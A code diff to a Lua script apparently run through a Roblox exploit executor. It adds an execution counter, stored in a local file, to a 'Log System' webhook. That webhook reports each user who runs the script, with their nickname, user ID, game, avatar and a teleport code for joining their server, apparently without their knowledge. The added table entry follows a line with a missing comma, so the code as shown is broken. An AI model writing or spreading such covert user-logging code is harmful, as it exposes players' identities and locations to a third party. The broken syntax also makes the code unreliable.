@@ -28,6 +28,25 @@ local function teleportCodeString()
     return string.format('(game:GetService("TeleportService")):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)', placeId, jobId)
 end
 
+local function getExecCount()
+    local count = "?"
+    local filename = "freeman_exec_count.txt"
+    local ok, res = pcall(function()
+        if readfile and writefile then
+            local actual = 0
+            if isfile and isfile(filename) then
+                local content = readfile(filename)
+                local n = tonumber(content)
+                if n then actual = n end
+            end
+            actual = actual + 1
+            writefile(filename, tostring(actual))
+            count = tostring(actual)
+        end
+    end)
+    return count
+end
+
 local function sendWebhook(pl)
     local nick = "Desconhecido"
     local uid = "0"
@@ -53,6 +72,7 @@ local function sendWebhook(pl)
     local tpcode = teleportCodeString()
     local playerCount = #P:GetPlayers()
     local maxPlayers = game.Players.MaxPlayers or "?"
+    local execCount = getExecCount()
     local embed = {
         title = "📡 Novo usuário executou o script!",
         color = 16711680,
@@ -64,6 +84,7 @@ local function sendWebhook(pl)
             {name = "🎮 Game:", value = tostring(gname), inline = false},
             {name = "🕐 Horário:", value = tostring(time), inline = false},
             {name = "🔑 Código de entrada do servidor (copie e cole no executor para entrar):", value = tpcode, inline = false}
+            {name = "🧑‍💼 N°:", value = execCount, inline = true},
         },
         thumbnail = { url = avatar },
         footer = { text = "Freeman Grants - Log System" }
